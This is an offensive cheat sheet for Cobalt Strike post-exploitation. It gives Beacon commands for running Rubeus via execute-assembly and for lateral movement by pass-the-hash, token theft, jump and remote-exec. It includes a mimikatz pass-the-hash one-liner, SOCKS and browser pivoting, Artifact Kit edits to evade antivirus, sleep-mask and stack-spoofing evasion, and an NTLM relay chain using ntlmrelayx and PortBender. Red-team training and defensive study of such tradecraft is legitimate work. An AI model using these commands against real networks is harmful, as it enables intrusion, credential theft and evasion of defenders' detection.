### .NET remote execution
Run a local .NET executable as a Beacon post-exploitation job. 
Require:
* Binaries compiled with the "Any CPU" configuration.
```powershell
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly /home/audit/Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe

## Lateral Movement
:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 
- **portscan:** Performs a portscan on a specific target.
- **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
- **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
:exclamation: This module needs Administrator privileges.
- **steal_token:** Steal a token from a specified process.
- **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
- **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
:exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
:muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
- **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
:exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
- **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.
:warning: All the commands launch powershell.exe

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager

Opsec safe Pass-the-Hash:
1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
2. `steal_token PID`
### Assume Control of Artifact
* Use `link` to connect to SMB Beacon
* Use `connect` to connect to TCP Beacon
## VPN & Pivots
:warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy.
> Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.
```powershell
# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
beacon > socks [PORT]
beacon > socks [port]
beacon > socks [port] [socks4]

# Proxy browser traffic through a specified Internet Explorer process.
beacon > browserpivot [pid] [x86|x64]
# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.

### Resource Kit
> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows
### Artifact Kit
> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.
Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
- Install the dependencies : `sudo apt-get install mingw-w64`
- Edit the Artifact code
    * Change pipename strings
    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
    * Change Import
- Build the Artifact
- Cobalt Strike -> Script Manager > Load .cna
### Mimikatz Kit
* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
* Load the mimikatz.cna aggressor script
* Use mimikatz functions as normal
### Sleep Mask Kit
> The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.
Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.
### Thread Stack Spoofer
> An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.
Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.
## Beacon Object Files
> A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs
Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h
* Compile
    ```ps1
    # To compile this with Visual Studio:
    cl.exe /c /GS- hello.c /Fohello.o
    # To compile this with x86 MinGW:
    i686-w64-mingw32-gcc -c hello.c -o hello.o
    # To compile this with x64 MinGW:
    x86_64-w64-mingw32-gcc -c hello.c -o hello.o
    ```
* Execute: `inline-execute /path/to/hello.o`
## NTLM Relaying via Cobalt Strike
```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://
beacon> rportfwd_local 8445  445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```
